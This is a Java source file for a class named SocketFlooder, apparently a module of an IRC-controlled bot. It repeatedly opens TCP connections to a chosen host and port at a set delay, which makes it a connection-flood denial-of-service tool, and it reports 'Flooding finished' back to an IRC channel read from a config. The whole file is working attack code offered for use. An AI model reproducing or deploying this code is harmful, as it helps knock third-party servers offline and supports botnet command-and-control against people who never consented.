package mn.num;

import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;

public class SocketFlooder extends Thread {
    private String url;
    private int port;
    private int times;
    private int delay;
    public static boolean flooding = false;
    public SocketFlooder(String url, int port, int times, int delay) {
        this.url = url;
        this.port = port;
        this.times = times;
        this.delay = delay;
    }

    @SuppressWarnings("deprecation")
    public void run() {
        for (int i = 0; i < times; i++) {
            try {
                if (!flooding) {
                    IRC.sendMessage(Config.getChannel(), "Flooding finished");
                    return;
                }
                @SuppressWarnings("unused")
                Socket s = new Socket(url, port);
                flooding = true;
            } catch (UnknownHostException e) {

                e.printStackTrace();
            } catch (IOException e) {

                e.printStackTrace();
            }
            try {
                Thread.sleep(delay);
            } catch (InterruptedException e) {

                e.printStackTrace();
            }
        }
        IRC.sendMessage(Config.getChannel(), "Flooding finished!");
        stop();
    }
}